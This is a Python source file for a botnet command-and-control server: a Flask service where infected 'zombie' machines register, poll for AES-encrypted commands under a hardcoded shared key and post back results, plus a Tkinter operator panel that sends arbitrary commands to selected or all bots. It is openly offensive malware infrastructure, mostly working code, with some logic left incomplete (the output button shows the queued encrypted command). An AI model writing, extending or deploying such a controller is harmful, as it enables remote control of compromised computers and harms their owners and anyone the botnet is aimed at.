from flask import Flask, request, jsonify
import time
import threading
import tkinter as tk
from tkinter import messagebox, scrolledtext
import requests
import json

# For encryption (the shared key with your zombie)
from base64 import b64encode, b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Shared AES key; must match the zombie's key.
KEY = b64decode('JxK69VY/eJVwNK8CWRFd2Q==')

def encrypt_data(data):
    cipher = AES.new(KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), 16))
    iv = b64encode(cipher.iv).decode('utf-8')
    ct = b64encode(ct_bytes).decode('utf-8')
    return iv, ct

# ----------------- Flask Server Setup -----------------
app = Flask(__name__)

# Bots dictionary: records each bot's info
bots = {}  # bot_id: {'last_seen': timestamp, 'ip': ip, 'os': os, 'iv': iv, 'cmd': cmd, 'key': key}

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    bot_id = data.get('id')
    if not bot_id:
        return jsonify({'error': 'missing id'}), 400

    ip = request.remote_addr
    bots[bot_id] = {
        'last_seen': time.time(),
        'ip': ip,
        'os': data.get('os'),
        'iv': '',     # Initially no command
        'cmd': '',
        'key': ''
    }
    return jsonify({'status': 'registered'})

@app.route('/get', methods=['GET'])
def get_command():
    bot_id = request.args.get('id')
    if bot_id in bots:
        # Optionally, you might update last_seen when a bot fetches its command.
        bots[bot_id]['last_seen'] = time.time()
        return jsonify(iv=bots[bot_id].get('iv', ''),
                       cmd=bots[bot_id].get('cmd', ''),
                       key=bots[bot_id].get('key', ''))
    else:
        return 'Bot not registered', 404

@app.route('/report', methods=['POST'])
def report():
    data = request.json
    bot_id = data.get('id')
    output = data.get('output')
    print(f"[+] Report from {bot_id}:")
    print(output)
    return jsonify({'status': 'received'})

@app.route('/send', methods=['POST'])
def send():
    data = request.json
    bot_id = data.get('id')
    cmd = data.get('cmd')
    if bot_id not in bots:
        return jsonify({'error': 'bot not found'}), 404
    # Encrypt the command
    iv, encrypted_cmd = encrypt_data(cmd)
    bots[bot_id]['iv'] = iv
    bots[bot_id]['cmd'] = encrypted_cmd
    bots[bot_id]['key'] = ''  # Not used
    return jsonify({'status': 'command queued'})

@app.route('/list', methods=['GET'])
def list_bots():
    # Cleanup: remove bots not seen in the last 30 seconds
    current_time = time.time()
    active_bots = {bot_id: info for bot_id, info in bots.items() if current_time - info['last_seen'] < 30}
    return jsonify(active_bots)

# ----------------- Tkinter GUI Setup -----------------
SERVER_URL = "http://127.0.0.1:5000"  # Adjust if hosting elsewhere

class C2GUI:
    def __init__(self, root):
        self.root = root
        self.root.title("C2 Command & Control Panel")
        self.root.geometry("800x600")
        self.root.configure(bg="#1e1e2e")

        # Bot list on the left.
        self.bot_list = tk.Listbox(root, bg="#2d2d3a", fg="white", width=30, font=("Consolas", 11), selectmode=tk.EXTENDED)
        self.bot_list.pack(side=tk.LEFT, fill=tk.Y, padx=10, pady=10)

        # Console output area
        self.console = scrolledtext.ScrolledText(root, bg="#11111a", fg="#00ff9f", font=("Courier", 11))
        self.console.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Control frame for command input and buttons
        control_frame = tk.Frame(root, bg="#1e1e2e")
        control_frame.pack(fill=tk.X, padx=10, pady=5)

        self.command_entry = tk.Entry(control_frame, font=("Consolas", 11), width=60)
        self.command_entry.pack(side=tk.LEFT, padx=5)

        send_btn = tk.Button(control_frame, text="Send Command", command=self.send_command, bg="#007acc", fg="white")
        send_btn.pack(side=tk.LEFT, padx=5)

        refresh_btn = tk.Button(control_frame, text="Refresh Bots", command=self.refresh_bots, bg="#5c5c8a", fg="white")
        refresh_btn.pack(side=tk.LEFT, padx=5)

        output_btn = tk.Button(control_frame, text="Fetch Output", command=self.get_output, bg="#5cb85c", fg="white")
        output_btn.pack(side=tk.LEFT, padx=5)

        select_all_btn = tk.Button(control_frame, text="Select All Bots", command=self.select_all_bots, bg="#a64ca6", fg="white")
        select_all_btn.pack(side=tk.LEFT, padx=5)

        self.refresh_bots()

    def log(self, text):
        self.console.insert(tk.END, text + "\n")
        self.console.see(tk.END)

    def refresh_bots(self):
        self.bot_list.delete(0, tk.END)
        try:
            response = requests.get(f"{SERVER_URL}/list")
            bots = response.json()
            for bot_id, info in bots.items():
                display_text = f"{bot_id} - {info.get('os', 'unknown')} - {info.get('ip', 'unknown')}"
                self.bot_list.insert(tk.END, display_text)
            self.log("[+] Bot list refreshed.")
        except Exception as e:
            self.log(f"[!] Error refreshing bot list: {e}")

    def send_command(self):
        selected_indices = self.bot_list.curselection()
        if not selected_indices:
            messagebox.showwarning("Warning", "Select at least one bot.")
            return

        cmd = self.command_entry.get()
        if not cmd:
            messagebox.showwarning("Warning", "Please enter a command.")
            return

        # Send command to each selected bot
        for index in selected_indices:
            bot_entry = self.bot_list.get(index)
            bot_id = bot_entry.split(" ")[0]  # Extract bot_id
            try:
                payload = {"id": bot_id, "cmd": cmd}
                response = requests.post(f"{SERVER_URL}/send", json=payload)
                if response.status_code == 200:
                    self.log(f"[>] Sent command to {bot_id}: {cmd}")
                else:
                    self.log(f"[!] Failed to send command to {bot_id}: {response.status_code}")
            except Exception as e:
                self.log(f"[!] Error sending command to {bot_id}: {e}")

    def get_output(self):
        selected_indices = self.bot_list.curselection()
        if not selected_indices:
            messagebox.showwarning("Warning", "Select at least one bot.")
            return

        for index in selected_indices:
            bot_entry = self.bot_list.get(index)
            bot_id = bot_entry.split(" ")[0]
            try:
                response = requests.get(f"{SERVER_URL}/get", params={"id": bot_id})
                data = response.json()
                # In our design, the /get response returns the encrypted command
                # (i.e. the last command that was sent). For a real implementation,
                # you might have a separate endpoint for command output.
                output = data.get("cmd", "No command or no output.")
                self.log(f"[OUTPUT from {bot_id}]\n{output}")
            except Exception as e:
                self.log(f"[!] Error getting output from {bot_id}: {e}")

    def select_all_bots(self):
        self.bot_list.select_set(0, tk.END)
        self.log("[*] All bots selected.")

# Run Flask server in a separate thread
def run_flask():
    app.run(host='0.0.0.0', port=5000, use_reloader=False)

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    # Start the Tkinter GUI
    root = tk.Tk()
    gui = C2GUI(root)
    root.mainloop()
